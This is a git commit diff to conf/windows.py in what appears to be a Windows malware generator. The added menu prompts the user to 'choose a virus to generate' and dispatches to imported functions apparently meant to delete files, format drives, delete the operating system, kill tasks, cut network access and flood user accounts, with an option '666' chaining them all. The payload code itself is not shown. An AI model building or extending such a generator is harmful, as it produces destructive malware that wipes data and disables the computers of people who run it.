f74d141dcec75297760af7eda7164ae361047676
Anikin Luke Abales <47096239+abalesluke@users.noreply.github.com>
2020-12-29 00:00:51 -0800

    Update windows.py

--- conf/windows.py
+++ conf/windows.py
@@ -1,13 +1,75 @@
 import os, time
 from .banner import *
+from conf.exe.winvir import *
+
 
 def windows():
+	banner2()
+	winhelp()
 	while True:
-		banner2()
-		print("Type -h to show commands\n")
+		print(c+"choose a virus to generate!")
 		ui = input(g+"win > ")
-		if(ui == '1'):
-			print("Nice")
+		if(ui == '-h'):
+			winhelp()
+
+		elif(ui == '1'):
+			overload()
+
 		elif(ui == '2'):
+			deletefiles()
+		
+		elif(ui == '3'):
+			bsof()
+		
+		elif(ui == '4'):
+			foolkey()
+		
+		elif(ui == '5'):
+			formatdrive()
+		
+		elif(ui == '6'):
+			shutdown()
+		
+		elif(ui == '7'):
+			userflood()
+		
+		elif(ui == '8'):
+			delos()
+		
+		elif(ui == '9'):
+			infnotepads()
+		
+		elif(ui == '10'):
+			Bomb()
+		
+		elif(ui == '11'):
+			taskill()
+
+		elif(ui == '12'):
+			netgone()
+
+		elif(ui == '666'):
+			netgone()
+			taskill()
+			Bomb()
+			infnotepads()
+			delos()
+			userflood()
+			shutdown()
+			formatdrive()
+			foolkey()
+			bsof()
+			bsof()
+			deletefiles()
+			overload()
+
+
+		elif(ui == '0'):
 			return()
 		
+		else:
+			print("Error!, Try executin -h")
+			winerror()
+
+		
+
